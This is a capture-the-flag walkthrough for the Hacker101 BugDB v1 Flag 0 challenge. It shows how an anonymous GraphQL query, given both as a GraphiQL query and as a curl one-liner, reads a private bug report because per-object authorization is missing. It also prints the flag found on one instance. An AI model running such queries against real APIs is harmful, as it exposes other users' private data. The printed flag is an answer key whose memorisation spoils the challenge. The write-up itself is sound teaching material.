# BugDB v1 — Flag 0 (Hacker101)

## Overview

The app is a small **GraphQL** API behind **GraphiQL** (linked from `/` as `graphql`). The right-hand **Docs** pane lists the schema: root fields, types, and connection shapes (`edges` / `node` / `pageInfo`). No authentication step is required for this flag—you can read everything the schema exposes with a single query.

## Goal

Find the flag string (`^FLAG^…$FLAG$`) in the dataset. It is stored as a **bug report’s `text`**, on a user who is not the obvious admin account.

## Steps

1. Open **`BASE/graphql`** (or follow **GraphiQL** from `BASE/`).
2. Use **Docs** to confirm types such as `User`, `Bug`, and list fields (`user`, `bugs`, etc.).
3. Run a query that walks **all users** and **all bugs** per user, including **`text`**, **`private`**, and ids you care about for orientation.

Example query:

```graphql
query {
  user {
    edges {
      node {
        id
        username
        bugs {
          pageInfo {
            startCursor
            endCursor
          }
          edges {
            cursor
            node {
              id
              reporterId
              text
              private
              reporter {
                id
              }
            }
          }
        }
      }
    }
  }
}
```

4. In the JSON result, look at **`bugs.edges[].node.text`**. On a typical instance the admin user has a public sample bug; another user has a **`private: true`** bug whose **`text`** is the flag.

## One-liner (HTTP)

```bash
curl -sS -X POST "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"query { user { edges { node { username bugs { edges { node { text private } } } } } } } }"}' \
  | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

(Adjust `$BASE` to your host; keep the path `/graphql`.)

## Why it works

GraphQL returns **exactly the fields you ask for**. Private bugs are still reachable if the resolver does not enforce per-bug authorization for this API—so “private” is a data flag, not a hard stop for anonymous queries in this challenge.

## Instance note

Flag bodies differ per deployment. On **`https://ed7be032dd5358ef3c47ff3ef0e2f3fe.ctf.hacker101.com/`**, the flag appeared under user **`victim`**, **`private: true`**.

**Example flag (that instance):** `^FLAG^b593744a535c745a14c9afb829f8eff3b492ec7d3d02fc60f41e026f00d72849$FLAG$`

## See also

Community notes for the same flag: [testert1ng/hacker101-ctf — bugdb_v1/flag0](https://github.com/testert1ng/hacker101-ctf/tree/master/bugdb_v1/flag0).
